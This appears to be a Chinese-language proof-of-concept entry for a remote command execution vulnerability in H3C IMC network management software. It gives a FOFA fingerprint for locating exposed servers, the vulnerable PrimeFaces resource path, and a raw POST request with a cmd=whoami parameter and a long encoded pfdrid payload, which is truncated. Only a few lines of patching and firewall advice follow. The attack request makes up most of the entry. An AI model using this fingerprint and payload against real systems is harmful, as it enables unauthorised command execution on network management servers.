# H3CIMC远程命令执行漏洞

- **系统**：H3CIMC　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`FOFA：`body="/imc/javax.faces.resource/images/login_help.png.jsf?ln=primefaces-imc-new-webui"``
- **请求**：`POST /imc/javax.faces.resource/dynamiccontent.properties.xhtml HTTP/1.1`

**请求体 / payload**
```
漏洞位置：`/imc/javax.faces.resource/dynamiccontent.properties.xhtml`\
数据包：
Host: 127.0.0.1:9090
Cookie: JSESSIONID=F92841E0E8B8B5862380EE8A26113638; oam.Flash.RENDERMAP.TOKEN=-2s6vgzlac
Content-Type: application/x-www-form-urlencoded
Content-Length: 1567
cmd=whoami&ln=primefaces&pfdrid=uMKljPgnOTVxmOB%2BH6%2FQEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVqupdmBV%2FKAe9gtw54DSQCl72JjEAsHTRvxAuJC%2B%2FIFzB8dhqyGafOLqDOqc4QwUqLOJ5KuwGRarsPnIcJJwQQ7fEGzDwgaD0Njf%2FcNrT5NsETV8ToCfDLgkzjKVoz1ghGlbYnrjgqWarDvBnuv%2BEo5hxA5sgRQcWsFs1aN0zI9h8ecWvxGVmreIAuWduuetMakDq7ccNwStDSn2W6c%2BGvDYH7pKUiyBaGv9gshhhVGunr…（脚本共 1818 字，完整版见原文）
```

**其他**
- H3C IMC 远程命令执行漏洞: * 一、漏洞概述
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
* 五、整改建议
***
- 版本: H3C IMC
- 整改建议: 升级IMC平台和相关组件的版本到最新，需注意适配的情况。其次可以在IMC所在的服务器的操作系统防火墙上配置出入站规则，拦截高危端口。在网络设备侧或安全设备侧通过安全策略、ACL的方式来进行拦截。条件允许的话，可考虑给服务器操作系统打补丁
> 原文: <公众号：渗透安全HackTwo>